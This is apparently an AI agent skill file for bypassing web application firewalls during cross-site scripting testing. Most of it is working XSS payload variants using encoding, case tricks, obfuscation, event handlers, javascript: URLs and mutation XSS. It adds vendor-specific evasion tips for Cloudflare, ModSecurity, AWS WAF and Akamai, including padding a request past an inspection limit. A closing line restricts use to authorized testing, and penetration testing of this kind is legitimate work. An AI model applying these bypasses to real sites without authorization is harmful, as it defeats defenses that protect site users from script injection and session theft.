---
name: xss-waf-bypass
description: Bypass WAFs (Cloudflare, ModSecurity, AWS WAF, Akamai) and input filters that block standard XSS payloads. Use when a context-appropriate payload is being blocked, sanitized, or stripped by a filter rather than failing for context reasons.
---

# XSS WAF & Filter Bypass

Use only when a baseline payload (from `xss-payload-selection`) is being **blocked by a filter** — not when it fails for context reasons.

## Diagnostic first

Before reaching for bypasses, identify what is being blocked:
- Send `<x>`, `<script>`, `onerror=`, `javascript:`, `alert(1)` individually.
- Compare server responses (status, body, length) to a benign baseline.
- Note whether input is **stripped**, **escaped**, **blocked (403/406)**, or **mutated**.

## Bypass categories

### Whitespace / delimiter tricks
```
<svg/onload=alert(1)>
<svg%0aonload=alert(1)>
<svg%09onload=alert(1)>
<img/src/onerror=alert(1)>
```

### Case & tag variation
```
<ScRiPt>alert(1)</ScRiPt>
<SVG ONLOAD=alert(1)>
<iMg sRc=x OnErRoR=alert(1)>
```

### Encoding
```
%3Cscript%3Ealert(1)%3C/script%3E             # single URL encoding
%253Cscript%253Ealert(1)%253C%252Fscript%253E  # double URL encoding
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;  # HTML entity (hex)
&#60;script&#62;alert(1)&#60;/script&#62;       # HTML entity (decimal)
<script>alert(1)</script>   # unicode escape (in JS context)
```

### Payload obfuscation (no literal "alert"/"script")
```
eval(atob('YWxlcnQoMSk='))
[].constructor.constructor('alert(1)')()
window['ale'+'rt'](1)
String.fromCharCode(97,108,101,114,116,40,49,41)
Function('alert(1)')()
```

### Tag-less / event-driven (when `<script>` is blocked)
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
```

### Protocol handlers
```
<a href="javascript:alert(1)">x</a>
<a href="javas&#9;cript:alert(1)">x</a>
<a href="java%0ascript:alert(1)">x</a>
<iframe src="javascript:alert(1)">
```

### Null byte / control char injection (older stacks)
```
<script>%00alert(1)</script>
<scri\x00pt>alert(1)</scri\x00pt>
```

### Mutation XSS (mXSS)
Use when sanitizer (e.g. DOMPurify older versions) normalizes HTML in a way that re-introduces a sink:
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg><style><img src=x onerror=alert(1)>
```

## Vendor-specific notes

- **Cloudflare:** Often blocks `onerror`, `onload` with `alert`. Try `prompt(1)`, `confirm(1)`, or `top['ale'+'rt'](1)`. Slash-delimited tags (`<svg/onload>`) frequently slip through.
- **ModSecurity (CRS):** Heavily signature-based. Double URL encoding and HTML entity encoding inside attribute values often bypass paranoia level 1–2.
- **AWS WAF:** Length-limited inspection (8 KB body). Pad payload past inspection limit if endpoint accepts large bodies.
- **Akamai:** Aggressive on `javascript:` — try `data:text/html;base64,...` in `href`.

## Workflow

1. Confirm the baseline payload is blocked, not just contextually wrong.
2. Identify which token triggers the block (binary-search the payload).
3. Apply the narrowest transformation that hides that token (case → encoding → obfuscation).
4. Stack techniques only if needed — single transformations are easier to debug.

## Ethics

Authorized testing only. Document every bypass for the report; do not exfiltrate data with PoCs.
